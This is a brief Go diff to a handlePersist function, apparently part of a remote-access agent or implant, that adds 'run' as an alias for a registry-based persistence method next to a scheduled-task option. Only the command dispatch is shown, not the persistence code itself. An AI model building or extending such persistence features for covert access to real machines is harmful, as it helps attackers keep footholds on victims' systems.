@@ -113,7 +113,7 @@ func handlePersist(args string) string {
 	remove := len(parts) > 1 && strings.ToLower(parts[1]) == "remove"
 
 	switch method {
-	case "registry", "reg":
+	case "registry", "reg", "run":
 		return persistRegistry(remove)
 	case "schtask", "task":
 		return persistScheduledTask(remove)
